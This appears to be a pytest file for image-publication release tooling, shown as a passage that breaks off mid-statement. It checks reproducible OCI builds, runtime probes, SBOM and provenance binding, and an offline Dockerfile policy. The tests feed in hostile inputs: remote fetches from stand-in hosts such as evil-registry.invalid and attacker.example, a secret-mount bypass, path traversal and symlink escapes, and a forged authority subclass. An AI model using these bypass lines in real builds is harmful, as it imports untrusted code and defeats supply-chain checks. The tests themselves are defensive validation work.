from __future__ import annotations

from contextlib import contextmanager
from copy import deepcopy
from dataclasses import replace
import gzip
import hashlib
import importlib.util
import io
import json
import os
from pathlib import Path
import socket
import stat
from types import SimpleNamespace
import subprocess
import sys
import tarfile
import tempfile
from typing import Iterator

import pytest

import release_tools.image_production_v2 as image_production
import release_tools.image_publication as image_publication
from release_tools.aws_authority_v2 import AttestedAwsClientV2, _CLIENT_TOKEN
from release_tools.contracts import (
    PrivateMutationEnvelopeV2,
    ReleasePlanV2,
    VerifiedPrivateMutationV2,
    write_new_private_mutation_envelope,
)
from release_tools.dispatch_attempt_v2 import (
    DispatchAttemptError,
    FreshDispatchAuthorityV1,
    ReleaseDispatchAttemptV1,
    _mint_fresh_dispatch_authority,
)
from release_tools.ecr import EcrEvidenceAdapter
from release_tools.image_publication import (
    ArtifactSubstitutionError,
    BuildReproducibilityError,
    EcrImagePublisher,
    FORBIDDEN_RUNTIME_COMMANDS,
    ImagePublicationPlanV1,
    ImagePublicationAmbiguous,
    ImagePublicationCollision,
    ImagePublicationError,
    PROVENANCE_ARTIFACT_TYPE,
    RuntimeBuildClosureError,
    SBOM_ARTIFACT_TYPE,
    prepare_runtime_build_closure,
    prepare_image_publication,
)
from release_tools.test_contracts import _release_plan_v2
from release_tools.test_transaction import (
    _advance_v2_until_phase,
    _create_v2,
    _observation,
    _retained_present_evidence,
    _resolved_mutation_request,
)


ACCOUNT = "123456789012"
REGION = "eu-west-1"
COMMIT = "a" * 40
TREE = "b" * 40
CATALOG = Path("bridge/capabilities/catalog-v1.json").read_bytes()
CATALOG_SHA256 = hashlib.sha256(CATALOG).hexdigest()
BASE_DIGEST = (
    "sha256:4e6b70dd6cbfc88c8157ba19aa3d9f9cce6ba4703576d55459e45efcbc9c5f5d"
)
OPENCLAW_DIGEST = "sha256:" + "2" * 64
BUILDER_ID = "https://personal-operator.invalid/builders/bridge-v2"
EXPECTED_TOOLS = [
    "po_file_list",
    "po_file_read",
    "po_file_write",
    "po_file_delete",
    "po_web_read",
    "po_schedule_list",
    "po_schedule_propose",
    "po_schedule_cancel_propose",
    "po_compute_run",
    "po_compute_status",
]


def _fresh_dispatch(
    verified: VerifiedPrivateMutationV2,
    *,
    provider: str = "ECR",
    operation_sha256: str | None = None,
    resolved_request_sha256: str | None = None,
) -> tuple[FreshDispatchAuthorityV1, ReleaseDispatchAttemptV1]:
    resolved = verified.resolved_request
    request = resolved.mutation_request
    attempt = ReleaseDispatchAttemptV1(
        release_plan_sha256=request.plan_sha256,
        evidence_store_sha256="1" * 64,
        journal_path_sha256="2" * 64,
        journal_execution_id="3" * 64,
        journal_revision=1,
        completed_prefix_sha256=request.completed_prefix_sha256,
        step_id=request.step_id,
        subject=request.subject,
        operation_sha256=(operation_sha256 or request.operation_sha256),
        resolved_request_sha256=(
            resolved_request_sha256 or resolved.digest()
        ),
        provider=provider,
    )
    return _mint_fresh_dispatch_authority(attempt), attempt


class _ForgedFreshDispatchAuthority(FreshDispatchAuthorityV1):
    """Subclass that deliberately skips the token-gated base constructor."""

    __slots__ = ("_forged_attempt",)

    def __init__(self, attempt: ReleaseDispatchAttemptV1) -> None:
        self._forged_attempt = attempt

    def consume(self, **_kwargs: object) -> ReleaseDispatchAttemptV1:
        return self._forged_attempt


def _json(value: object) -> bytes:
    return json.dumps(
        value,
        allow_nan=False,
        separators=(",", ":"),
        sort_keys=True,
    ).encode("utf-8")


def _tar(
    files: dict[str, bytes] | None = None,
    *,
    symlink: tuple[str, str] | None = None,
) -> bytes:
    source = files or {
        "bridge/Dockerfile": Path("bridge/Dockerfile").read_bytes(),
        "bridge/.dockerignore": Path("bridge/.dockerignore").read_bytes(),
        "bridge/package.json": b'{"name":"bridge"}\n',
        "bridge/package-lock.json": b'{"lockfileVersion":3}\n',
        "bridge/entrypoint.sh": b"#!/bin/sh\nexec node /app/agentcore-contract.js\n",
        "bridge/agentcore-contract.js": b"export const healthy = true;\n",
        "bridge/agentcore-contract.test.js": b"throw new Error('excluded');\n",
        "bridge/CLAUDE.md": b"excluded local guidance\n",
        "bridge/plugins/personal-operator/index.js": b"export default {};\n",
    }
    if files is None:
        source.update(
            {
                path: payload
                for path, (payload, _) in _capability_files().items()
            }
        )
    output = io.BytesIO()
    with tarfile.open(fileobj=output, mode="w", format=tarfile.USTAR_FORMAT) as archive:
        for path, payload in source.items():
            item = tarfile.TarInfo(path)
            item.size = len(payload)
            item.mode = 0o755 if path.endswith("entrypoint.sh") else 0o644
            item.mtime = 1_721_260_800
            archive.addfile(item, io.BytesIO(payload))
        if symlink is not None:
            item = tarfile.TarInfo(symlink[0])
            item.type = tarfile.SYMTYPE
            item.linkname = symlink[1]
            archive.addfile(item)
    return output.getvalue()


def _capability_files() -> dict[str, tuple[bytes, int]]:
    root = Path("bridge/capabilities")
    paths = [root / "catalog-v1.json", *sorted((root / "schemas").glob("*.json"))]
    return {
        path.as_posix(): (path.read_bytes(), 0o644)
        for path in paths
    }


def test_exact_git_catalog_compiles_to_a_distinct_commit_bound_digest_and_loads(
    tmp_path: Path,
) -> None:
    source_sha, catalog_digest, tools = image_publication._compile_capability_catalog(
        _capability_files(),
        release_commit=COMMIT,
    )

    assert source_sha == hashlib.sha256(
        Path("bridge/capabilities/catalog-v1.json").read_bytes()
    ).hexdigest()
    assert catalog_digest != source_sha
    assert tools == tuple(EXPECTED_TOOLS)
    release = tmp_path / "release-v1.json"
    release.write_bytes(
        _json(
            {
                "schema": "personal-operator.capability-release.v1",
                "releaseCommit": COMMIT,
                "catalogDigest": catalog_digest,
            }
        )
    )
    completed = subprocess.run(
        [
            "/opt/homebrew/opt/node@24/bin/node",
            "-e",
            (
                "const catalog=require('./bridge/capability-catalog');"
                "const loaded=catalog.loadRuntimeCapabilityRelease({"
                "releasePath:process.argv[1]});"
                "process.stdout.write(JSON.stringify(loaded.toolNames));"
            ),
            str(release),
        ],
        cwd=Path.cwd(),
        capture_output=True,
        text=True,
        check=False,
    )
    assert completed.returncode == 0, completed.stdout + completed.stderr
    assert json.loads(completed.stdout) == EXPECTED_TOOLS


def _descriptor(media_type: str, payload: bytes) -> dict[str, object]:
    return {
        "mediaType": media_type,
        "digest": "sha256:" + hashlib.sha256(payload).hexdigest(),
        "size": len(payload),
    }


def _gzip_layer(files: dict[str, bytes]) -> tuple[bytes, bytes]:
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w", format=tarfile.USTAR_FORMAT) as archive:
        for path, payload in sorted(files.items()):
            member = tarfile.TarInfo(path.removeprefix("/"))
            member.size = len(payload)
            member.mode = 0o755 if path.endswith(("entrypoint.sh", "openclaw.mjs")) else 0o644
            member.uid = 0
            member.gid = 0
            member.mtime = 0
            archive.addfile(member, io.BytesIO(payload))
    uncompressed = raw.getvalue()
    compressed = gzip.compress(uncompressed, compresslevel=9, mtime=0)
    return compressed, uncompressed


def _custom_layer(
    entries: list[tuple[tarfile.TarInfo, bytes | None]],
) -> tuple[image_publication.OciDescriptor, bytes, str]:
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w", format=tarfile.USTAR_FORMAT) as archive:
        for member, payload in entries:
            member.uid = 0
            member.gid = 0
            member.mtime = 0
            archive.addfile(member, io.BytesIO(payload) if payload is not None else None)
    uncompressed = raw.getvalue()
    compressed = gzip.compress(uncompressed, compresslevel=9, mtime=0)
    descriptor = image_publication.OciDescriptor(
        "application/vnd.oci.image.layer.v1.tar+gzip",
        "sha256:" + hashlib.sha256(compressed).hexdigest(),
        len(compressed),
    )
    return descriptor, compressed, "sha256:" + hashlib.sha256(uncompressed).hexdigest()


def _regular_member(path: str, payload: bytes = b"") -> tuple[tarfile.TarInfo, bytes]:
    member = tarfile.TarInfo(path.removeprefix("/"))
    member.size = len(payload)
    member.mode = 0o644
    return member, payload


def _build_result(
    *,
    marker: str = "stable",
    labels: dict[str, str] | None = None,
) -> dict[str, object]:
    layer, uncompressed_layer = _gzip_layer(
        {
            "/app/agentcore-contract.js": ("runtime contract:" + marker).encode(),
            "/app/capabilities/release-v1.json": b"release binding",
            "/app/entrypoint.sh": b"entrypoint",
            "/etc/ssl/certs/ca-certificates.crt": b"tls roots",
            "/opt/openclaw/openclaw.mjs": b"openclaw runtime",
        }
    )
    runtime_config = {
        "Entrypoint": ["/app/entrypoint.sh"],
        "Env": [
            "AWS_REGION=eu-west-1",
            "HOME=/run/personal-operator/home",
        ],
        "User": "1000:1000",
        "WorkingDir": "/app",
    }
    if labels is not None:
        runtime_config["Labels"] = labels
    config = _json(
        {
            "architecture": "arm64",
            "config": runtime_config,
            "os": "linux",
            "rootfs": {
                "diff_ids": [
                    "sha256:" + hashlib.sha256(uncompressed_layer).hexdigest()
                ],
                "type": "layers",
            },
        }
    )
    manifest = _json(
        {
            "config": _descriptor(
                "application/vnd.oci.image.config.v1+json",
                config,
            ),
            "layers": [
                _descriptor(
                    "application/vnd.oci.image.layer.v1.tar+gzip",
                    layer,
                )
            ],
            "mediaType": "application/vnd.oci.image.manifest.v1+json",
            "schemaVersion": 2,
        }
    )
    return {
        "schema": "personal-operator.oci-build-result.v2",
        "platform": "linux/arm64",
        "manifest": manifest,
        "blobs": {
            "sha256:" + hashlib.sha256(config).hexdigest(): config,
            "sha256:" + hashlib.sha256(layer).hexdigest(): layer,
        },
    }


class FakeGitArchive:
    def __init__(self, payload: bytes | None = None) -> None:
        self.payload = payload or _tar()
        self.calls: list[dict[str, str]] = []

    def export_archive(self, **kwargs) -> bytes:
        self.calls.append(kwargs)
        return self.payload


class FakeBuilder:
    def __init__(self, results: list[dict[str, object]] | None = None) -> None:
        self.results = results or [_build_result(), _build_result()]
        self.calls: list[dict[str, object]] = []

    def build(self, archive: bytes, **kwargs) -> dict[str, object]:
        self.calls.append({"archive": archive, **kwargs})
        return deepcopy(self.results[len(self.calls) - 1])


def _probe_evidence() -> dict[str, object]:
    catalog_digest = image_publication._compile_capability_catalog(
        _capability_files(), release_commit=COMMIT
    )[1]
    return {
        "schema": "personal-operator.image-probe.v1",
        "platform": "linux/arm64",
        "uid": 1000,
        "gid": 1000,
        "tlsRoots": True,
        "trustedRootsReadOnly": True,
        "startupStatus": "HEALTHY",
        "credentialsAbsent": True,
        "networkDenied": True,
        "ensurepipUnavailable": True,
        "pipModuleUnavailable": True,
        "browserArtifactsAbsent": True,
        "modelCallableTools": EXPECTED_TOOLS,
        "forbiddenCommandsAbsent": list(FORBIDDEN_RUNTIME_COMMANDS),
        "releaseCommit": COMMIT,
        "catalogSha256": catalog_digest,
    }


class FakeProbe:
    def __init__(self, results: list[dict[str, object]] | None = None) -> None:
        self.results = results or [_probe_evidence(), _probe_evidence()]
        self.calls: list[dict[str, object]] = []

    def run(self, *, manifest: bytes, blobs: dict[str, bytes], **kwargs):
        self.calls.append({"manifest": manifest, "blobs": blobs, **kwargs})
        return deepcopy(self.results[len(self.calls) - 1])


def _prepare(
    *,
    git: FakeGitArchive | None = None,
    builder: FakeBuilder | None = None,
    probe: FakeProbe | None = None,
    closure=None,
):
    closure = closure or _prepare_closure(_trusted_runtime_provider()[0])
    return prepare_image_publication(
        git_archive=git or FakeGitArchive(),
        builder=builder or FakeBuilder(),
        probe=probe or FakeProbe(),
        source_commit=COMMIT,
        source_tree=TREE,
        account=ACCOUNT,
        region=REGION,
        created="2026-07-20T00:00:00Z",
        builder_id=BUILDER_ID,
        runtime_build_closure=closure,
        builder_dependencies=(
            {
                "uri": "pkg:docker/node@24.15.0-slim",
                "digest": BASE_DIGEST,
            },
            {
                "uri": "pkg:docker/python@3.13-slim",
                "digest": (
                    "sha256:"
                    "7f6f057c60bb4b050500ab319f5fd13f842bf2367b038b7362d1b3e416fa3d9d"
                ),
            },
            {
                "uri": "urn:personal-operator:runtime-build-closure",
                "digest": "sha256:" + closure.manifest_sha256,
            },
        ),
    )


def test_producer_uses_only_exact_git_archive_and_two_fresh_identical_builds() -> None:
    git = FakeGitArchive()
    builder = FakeBuilder()
    probe = FakeProbe()

    bundle = _prepare(git=git, builder=builder, probe=probe)

    assert git.calls == [
        {
            "source_commit": COMMIT,
            "source_tree": TREE,
            "path": "bridge",
        }
    ]
    assert len(builder.calls) == 2
    assert [call["build_id"] for call in builder.calls] == ["fresh-1", "fresh-2"]
    assert all(call["platform"] == "linux/arm64" for call in builder.calls)
    assert all(call["network_mode"] == "none" for call in builder.calls)
    assert all(call["no_cache"] is True for call in builder.calls)
    assert all(call["pull"] is False for call in builder.calls)
    assert all(call["source_date_epoch"] == 0 for call in builder.calls)
    assert builder.calls[0]["archive"] == builder.calls[1]["archive"]
    with tarfile.open(fileobj=io.BytesIO(builder.calls[0]["archive"]), mode="r:") as tar:
        names = tar.getnames()
    assert "bridge/Dockerfile" in names
    assert {
        "bridge/build-closure/runtime-build-closure.json",
        "bridge/build-closure/openclaw-runtime.manifest.json",
        "bridge/build-closure/openclaw-runtime.tar.gz",
        "bridge/build-closure/bridge-node-modules.manifest.json",
        "bridge/build-closure/bridge-node-modules.tar.gz",
    }.issubset(names)
    assert "bridge/agentcore-contract.test.js" not in names
    assert "bridge/CLAUDE.md" not in names
    assert all("node_modules" not in name for name in names)
    build_arguments = builder.calls[0]["build_arguments"]
    assert build_arguments["PERSONAL_OPERATOR_RELEASE_COMMIT"] == COMMIT
    assert build_arguments["PERSONAL_OPERATOR_RELEASE_TREE"] == TREE
    assert build_arguments["OPENCLAW_SOURCE_COMMIT"] == OPENCLAW_COMMIT
    assert build_arguments["OPENCLAW_SOURCE_TREE"] == OPENCLAW_TREE
    assert build_arguments["RUNTIME_BUILD_CLOSURE_MANIFEST_SHA256"]
    assert build_arguments["PERSONAL_OPERATOR_CATALOG_SOURCE_SHA256"] == CATALOG_SHA256
    assert (
        build_arguments["PERSONAL_OPERATOR_CAPABILITY_CATALOG_DIGEST"]
        == bundle.plan.capability_catalog_digest
    )
    assert bundle.plan.catalog_source_sha256 == CATALOG_SHA256
    assert bundle.plan.capability_catalog_digest != CATALOG_SHA256
    assert bundle.plan.model_callable_tools == tuple(EXPECTED_TOOLS)
    assert len(probe.calls) == 2
    assert all(call["network_mode"] == "none" for call in probe.calls)
    assert all(call["credentials"] == {} for call in probe.calls)
    assert all(call["read_only_root"] is True for call in probe.calls)
    assert bundle.plan.subject_manifest_digest.startswith("sha256:")
    assert bundle.plan.sbom_manifest_digest.startswith("sha256:")
    assert bundle.plan.provenance_manifest_digest.startswith("sha256:")
    assert bundle.plan_sha256 == hashlib.sha256(bundle.plan.to_bytes()).hexdigest()
    assert bundle.plan.publication_plan_sha256 == bundle.plan_sha256


def test_two_fresh_builds_must_have_identical_complete_oci_closure() -> None:
    builder = FakeBuilder([_build_result(), _build_result(marker="changed")])

    with pytest.raises(BuildReproducibilityError, match="identical OCI closure"):
        _prepare(builder=builder)


def test_builder_supplied_runtime_inventory_is_rejected_even_when_claims_match() -> None:
    first = _build_result()
    second = deepcopy(first)
    claim = [{"path": "/app/agentcore-contract.js", "sha256": "f" * 64, "size": 1}]
    first["inventory"] = claim
    second["inventory"] = deepcopy(claim)

    with pytest.raises(ImagePublicationError, match="fields"):
        _prepare(builder=FakeBuilder([first, second]))


def test_oci_rootfs_diff_id_must_match_authenticated_uncompressed_layer() -> None:
    result = _build_result()
    manifest = json.loads(result["manifest"])
    old_config_digest = manifest["config"]["digest"]
    config = json.loads(result["blobs"].pop(old_config_digest))
    config["rootfs"]["diff_ids"] = ["sha256:" + "f" * 64]
    config_payload = _json(config)
    manifest["config"] = _descriptor(
        "application/vnd.oci.image.config.v1+json", config_payload
    )
    result["manifest"] = _json(manifest)
    result["blobs"][manifest["config"]["digest"]] = config_payload

    with pytest.raises(ImagePublicationError, match="diff ID"):
        _prepare(builder=FakeBuilder([result, deepcopy(result)]))


def _required_layer_files() -> dict[str, bytes]:
    return {
        "/app/agentcore-contract.js": b"runtime contract",
        "/app/capabilities/release-v1.json": b"release binding",
        "/app/entrypoint.sh": b"entrypoint",
        "/etc/ssl/certs/ca-certificates.crt": b"tls roots",
        "/opt/openclaw/openclaw.mjs": b"openclaw runtime",
    }


def _derived_inventory(
    layers: list[tuple[image_publication.OciDescriptor, bytes, str]],
):
    return image_publication._derive_runtime_inventory(
        [item[0] for item in layers],
        {item[0].digest: item[1] for item in layers},
        [item[2] for item in layers],
    )


def test_authenticated_oci_layers_apply_whiteouts_and_keep_zero_length_files() -> None:
    base_payload, base_raw = _gzip_layer(
        _required_layer_files()
        | {
            "/opt/openclaw/obsolete.js": b"old",
            "/app/empty.txt": b"",
        }
    )
    base = (
        image_publication.OciDescriptor(
            "application/vnd.oci.image.layer.v1.tar+gzip",
            "sha256:" + hashlib.sha256(base_payload).hexdigest(),
            len(base_payload),
        ),
        base_payload,
        "sha256:" + hashlib.sha256(base_raw).hexdigest(),
    )
    whiteout = _regular_member("opt/openclaw/.wh.obsolete.js")
    overlay = _custom_layer([whiteout])

    inventory = _derived_inventory([base, overlay])
    by_path = {item.path: item for item in inventory}

    assert "/opt/openclaw/obsolete.js" not in by_path
    assert by_path["/app/empty.txt"].size == 0
    assert by_path["/app/empty.txt"].sha256 == hashlib.sha256(b"").hexdigest()


@pytest.mark.parametrize(
    ("entry", "match"),
    [
        ((_regular_member("../escape", b"escape")), "unsafe"),
        ((_regular_member("opt/openclaw/node_modules/playwright-core/index.js", b"x")), "browser"),
    ],
)
def test_authenticated_oci_layers_reject_traversal_and_browser_content(
    entry,
    match: str,
) -> None:
    required = [_regular_member(path, payload) for path, payload in _required_layer_files().items()]
    layer = _custom_layer([*required, entry])

    with pytest.raises(ImagePublicationError, match=match):
        _derived_inventory([layer])


def test_authenticated_oci_layers_reject_special_files_and_required_symlinks() -> None:
    fifo = tarfile.TarInfo("app/forbidden-fifo")
    fifo.type = tarfile.FIFOTYPE
    special = _custom_layer(
        [
            *[
                _regular_member(path, payload)
                for path, payload in _required_layer_files().items()
            ],
            (fifo, None),
        ]
    )
    with pytest.raises(ImagePublicationError, match="special"):
        _derived_inventory([special])

    symlink = tarfile.TarInfo("app/entrypoint.sh")
    symlink.type = tarfile.SYMTYPE
    symlink.linkname = "agentcore-contract.js"
    linked = _custom_layer(
        [
            *[
                _regular_member(path, payload)
                for path, payload in _required_layer_files().items()
                if path != "/app/entrypoint.sh"
            ],
            (symlink, None),
        ]
    )
    with pytest.raises(ImagePublicationError, match="incomplete"):
        _derived_inventory([linked])


@pytest.mark.parametrize(
    ("field", "value", "match"),
    [
        ("platform", "linux/amd64", "ARM64"),
        ("uid", 0, "nonroot"),
        ("tlsRoots", False, "TLS"),
        ("trustedRootsReadOnly", False, "immutable"),
        ("startupStatus", "FAILED", "startup"),
        ("credentialsAbsent", False, "credential"),
        ("networkDenied", False, "network"),
        ("ensurepipUnavailable", False, "ensurepip"),
        ("pipModuleUnavailable", False, "pip module"),
        ("browserArtifactsAbsent", False, "browser"),
        ("modelCallableTools", EXPECTED_TOOLS[:-1], "model-callable"),
        ("forbiddenCommandsAbsent", [], "package or build tool"),
        ("releaseCommit", "f" * 40, "release"),
        ("catalogSha256", "f" * 64, "catalog"),
    ],
)
def test_probe_must_prove_every_runtime_boundary(
    field: str,
    value: object,
    match: str,
) -> None:
    evidence = _probe_evidence()
    evidence[field] = value
    probe = FakeProbe([evidence, _probe_evidence()])

    with pytest.raises(ImagePublicationError, match=match):
        _prepare(probe=probe)


def test_build_result_rejects_wrong_platform() -> None:
    result = _build_result()
    result["platform"] = "linux/amd64"
    with pytest.raises(ImagePublicationError, match="ARM64"):
        _prepare(builder=FakeBuilder([result, result]))


@pytest.mark.parametrize(
    ("config_mutation", "match"),
    [
        (lambda value: value.update(architecture="amd64"), "ARM64"),
        (lambda value: value["config"].update(User="0"), "nonroot"),
        (
            lambda value: value["config"].update(
                Env=["AWS_ACCESS_KEY_ID=not-a-real-key"]
            ),
            "credential",
        ),
        (
            lambda value: value["config"].update(Entrypoint=["/bin/sh"]),
            "entrypoint",
        ),
    ],
)
def test_oci_config_is_closed_and_credential_free(config_mutation, match: str) -> None:
    result = _build_result()
    manifest = json.loads(result["manifest"])
    config_digest = manifest["config"]["digest"]
    config = json.loads(result["blobs"].pop(config_digest))
    config_mutation(config)
    config_bytes = _json(config)
    manifest["config"] = _descriptor(
        "application/vnd.oci.image.config.v1+json", config_bytes
    )
    result["manifest"] = _json(manifest)
    result["blobs"][manifest["config"]["digest"]] = config_bytes

    with pytest.raises(ImagePublicationError, match=match):
        _prepare(builder=FakeBuilder([result, result]))


def test_git_archive_rejects_symlinks_and_paths_outside_exact_bridge_tree() -> None:
    with pytest.raises(ImagePublicationError, match="symlink"):
        _prepare(
            git=FakeGitArchive(
                _tar(symlink=("bridge/escape", "../../operator-home"))
            )
        )

    files = {
        "bridge/Dockerfile": b"FROM scratch\n",
        "bridge/package.json": b"{}\n",
        "bridge/package-lock.json": b"{}\n",
        "bridge/entrypoint.sh": b"#!/bin/sh\n",
        "bridge/agentcore-contract.js": b"x\n",
        "bridge/capabilities/catalog-v1.json": CATALOG,
        "outside.txt": b"dirty\n",
    }
    with pytest.raises(ImagePublicationError, match="bridge tree"):
        _prepare(git=FakeGitArchive(_tar(files)))


@pytest.mark.parametrize(
    "instruction",
    [
        "RUN apt-get update && apt-get install -y ca-certificates\n",
        "RUN git fetch --depth 1 origin deadbeef\n",
        "RUN corepack prepare pnpm@10.0.0 --activate && pnpm install\n",
        "RUN npm ci --omit=dev\n",
    ],
)
def test_network_fetched_build_inputs_are_an_explicit_stop_condition(
    instruction: str,
) -> None:
    files = {
        "bridge/Dockerfile": ("FROM scratch\n" + instruction).encode(),
        "bridge/package.json": b"{}\n",
        "bridge/package-lock.json": b"{}\n",
        "bridge/entrypoint.sh": b"#!/bin/sh\n",
        "bridge/agentcore-contract.js": b"x\n",
        "bridge/capabilities/catalog-v1.json": CATALOG,
        "bridge/capabilities/schemas/po-file-read-input.json": b"{}\n",
    }
    builder = FakeBuilder()

    with pytest.raises(ImagePublicationError, match="network-fetched build input"):
        _prepare(git=FakeGitArchive(_tar(files)), builder=builder)

    assert builder.calls == []


@pytest.mark.parametrize(
    "instruction",
    [
        "RUN echo bypass",
        "RUN --network=host echo bypass",
        "RUN --network=none --mount=type=secret,id=token echo bypass",
        "RUN --network=none curl https://example.invalid/input",
        "RUN --network=none wget https://example.invalid/input",
        "RUN --network=none python3 -c \"import urllib.request; urllib.request.urlopen('https://example.invalid')\"",
        "RUN --network=none apk add git",
        "RUN --network=none apt install git",
        "RUN --network=none pip3 install package",
        "RUN --network=none python3 -m pip install package",
        "RUN --network=none yarn install --immutable",
        "RUN --network=none npm install package",
        "ADD https://example.invalid/archive.tar /tmp/archive.tar",
        "COPY --from=evil-registry.invalid/runtime:latest /payload /app/payload",
    ],
)
def test_complete_dockerfile_policy_rejects_offline_bypasses(instruction: str) -> None:
    dockerfile = Path("bridge/Dockerfile").read_text() + "\n" + instruction + "\n"

    with pytest.raises(ImagePublicationError, match="Dockerfile|network|build"):
        image_publication._validate_dockerfile_is_offline(
            {"bridge/Dockerfile": (dockerfile.encode(), 0o644)}
        )


@pytest.mark.parametrize(
    "directive",
    [
        "# syntax=attacker.example/custom/frontend:latest",
        "# escape=`",
        "# check=skip=all",
    ],
)
def test_dockerfile_parser_directives_cannot_change_offline_semantics(
    directive: str,
) -> None:
    dockerfile = directive + "\n" + Path("bridge/Dockerfile").read_text()

    with pytest.raises(ImagePublicationError, match="parser directive"):
        image_publication._validate_dockerfile_is_offline(
            {"bridge/Dockerfile": (dockerfile.encode(), 0o644)}
        )


def test_dockerfile_closure_consumption_is_exact_reviewed_bytes() -> None:
    source = Path("bridge/Dockerfile").read_text()
    trusted_copy = (
        "COPY build-closure/runtime-build-closure.json "
        "/tmp/runtime-build-closure/runtime-build-closure.json"
    )
    substituted = source.replace(trusted_copy, "# " + trusted_copy)
    assert substituted != source

    with pytest.raises(ImagePublicationError, match="reviewed closure semantics"):
        image_publication._validate_dockerfile_is_offline(
            {"bridge/Dockerfile": (substituted.encode(), 0o644)}
        )


def test_dockerfile_cannot_overwrite_verified_closure_outputs_later() -> None:
    substituted = (
        Path("bridge/Dockerfile").read_text()
        + "\nCOPY package.json /opt/openclaw/package.json\n"
    )

    with pytest.raises(ImagePublicationError, match="reviewed closure semantics"):
        image_publication._validate_dockerfile_is_offline(
            {"bridge/Dockerfile": (substituted.encode(), 0o644)}
        )


def test_generated_spdx_and_slsa_payloads_bind_exact_subject_and_source() -> None:
    bundle = _prepare()
    sbom = json.loads(bundle.blob(bundle.plan.sbom_payload_digest))
    provenance = json.loads(bundle.blob(bundle.plan.provenance_payload_digest))

    assert sbom["spdxVersion"] == "SPDX-2.3"
    subject_package = next(
        item for item in sbom["packages"] if item["name"] == "personal-operator/bridge"
    )
    assert subject_package["checksums"] == [
        {
            "algorithm": "SHA256",
            "checksumValue": bundle.plan.subject_manifest_digest.removeprefix(
                "sha256:"
            ),
        }
    ]
    assert all(not item["fileName"].endswith(".test.js") for item in sbom["files"])
    assert {item["fileName"] for item in sbom["files"]} >= {
        "/app/agentcore-contract.js",
        "/app/capabilities/release-v1.json",
        "/etc/ssl/certs/ca-certificates.crt",
        "/opt/openclaw/openclaw.mjs",
    }
    assert all(not item["fileName"].startswith("/build-context/") for item in sbom["files"])
    EcrEvidenceAdapter._validate_sbom(
        bundle.blob(bundle.plan.sbom_payload_digest),
        subject_digest=bundle.plan.subject_manifest_digest,
    )
    assert provenance["_type"] == "https://in-toto.io/Statement/v1"
    assert provenance["predicateType"] == "https://slsa.dev/provenance/v1"
    assert provenance["subject"] == [
        {
            "name": "personal-operator/bridge",
            "digest": {
                "sha256": bundle.plan.subject_manifest_digest.removeprefix("sha256:")
            },
        }
    ]
    external = provenance["predicate"]["buildDefinition"]["externalParameters"]
    assert external["sourceCommit"] == COMMIT
    assert external["sourceTree"] == TREE
    assert external["gitArchiveSha256"] == bundle.plan.git_archive_sha256


def test_publication_plan_round_trips_only_canonical_exact_bytes() -> None:
    plan = _prepare().plan

    assert ImagePublicationPlanV1.from_bytes(plan.to_bytes()) == plan
    noncanonical = (json.dumps(plan.to_mapping(), indent=2) + "\n").encode()
    with pytest.raises(ImagePublicationError, match="canonical"):
        ImagePublicationPlanV1.from_bytes(noncanonical)

    substituted = plan.to_mapping()
    substituted["repositoryName"] = "other/repository"
    with pytest.raises(ImagePublicationError, match="repository"):
        ImagePublicationPlanV1.from_bytes(_json(substituted))


def test_bundle_validation_rejects_manifest_or_blob_substitution() -> None:
    bundle = _prepare()
    manifests = dict(bundle.manifests)
    manifests[bundle.plan.sbom_manifest_digest] += b" "
    substituted = bundle.replace(manifests=manifests)

    with pytest.raises(ArtifactSubstitutionError, match="manifest"):
        substituted.validate(expected_plan_sha256=bundle.plan_sha256)

    blobs = dict(bundle.blobs)
    blobs[bundle.plan.provenance_payload_digest] += b" "
    substituted = bundle.replace(blobs=blobs)
    with pytest.raises(ArtifactSubstitutionError, match="blob"):
        substituted.validate(expected_plan_sha256=bundle.plan_sha256)

    probes = dict(bundle.probe_evidence)
    del probes["fresh-2"]
    with pytest.raises(ArtifactSubstitutionError, match="probe"):
        bundle.replace(probe_evidence=probes).validate(
            expected_plan_sha256=bundle.plan_sha256
        )


def _bundle_with_distinct_self_consistent_probe_evidence():
    bundle = _prepare()
    second = _probe_evidence()
    second["gid"] = 1001
    second_payload = _json(second)
    plan = replace(
        bundle.plan,
        probe_evidence=(
            bundle.plan.probe_evidence[0],
            image_publication.ProbeEvidenceDescriptor(
                "fresh-2",
                hashlib.sha256(second_payload).hexdigest(),
                len(second_payload),
            ),
        ),
    )
    return bundle.replace(
        plan=plan,
        probe_evidence={
            "fresh-1": bundle.probe_evidence["fresh-1"],
            "fresh-2": second_payload,
        },
    )


def test_bundle_validation_rejects_distinct_self_consistent_probe_evidence() -> None:
    bundle = _bundle_with_distinct_self_consistent_probe_evidence()

    with pytest.raises(ImagePublicationError, match="probe evidence differs"):
        bundle.validate(expected_plan_sha256=bundle.plan_sha256)


def test_token_preflight_rejects_distinct_probe_evidence_descriptors() -> None:
    bundle = _bundle_with_distinct_self_consistent_probe_evidence()
    effects = tuple(
        replace(
            effect,
            publication_plan_sha256=bundle.plan_sha256,
        )
        for effect in _prepare().publication_effects(
            expected_plan_sha256=_prepare().plan_sha256
        )
    )
    facade = SimpleNamespace(
        plan=bundle.plan,
        plan_sha256=bundle.plan_sha256,
        publication_effects=lambda **_: effects,
    )
    release_plan = _release_plan_for_image(facade)

    with pytest.raises(ImagePublicationError, match="probe evidence differs"):
        image_publication.validate_image_publication_preflight(
            bundle.plan.to_bytes(),
            effects,
            release_plan=release_plan,
        )


def test_compound_bundle_has_no_release_artifact_or_dispatch_api() -> None:
    bundle = _prepare()
    assert not hasattr(bundle, "write_private_file")
    assert not hasattr(type(bundle), "from_private_file")
    assert not hasattr(image_publication, "IMAGE_BUNDLE_MAGIC")


def test_effect_inventory_writes_unique_raw_plan_bound_request_artifacts(
    tmp_path: Path,
) -> None:
    bundle = _prepare()

    effects = bundle.publication_effects(
        expected_plan_sha256=bundle.plan_sha256
    )

    assert [effect.effect_kind for effect in effects[: len(bundle.blobs)]] == [
        "ECR_BLOB_PUT"
    ] * len(bundle.blobs)
    assert [effect.effect_kind for effect in effects[-3:]] == [
        "ECR_SUBJECT_MANIFEST_PUT",
        "ECR_SBOM_REFERRER_PUT",
        "ECR_PROVENANCE_REFERRER_PUT",
    ]
    assert [effect.digest for effect in effects[: len(bundle.blobs)]] == sorted(
        bundle.blobs
    )
    assert effects[0].provider_subject == (
        f"ecr:{ACCOUNT}:{REGION}:repository:personal-operator/bridge:blob:"
        f"{effects[0].digest}"
    )
    assert effects[-3].provider_subject == (
        f"ecr:{ACCOUNT}:{REGION}:repository:personal-operator/bridge:"
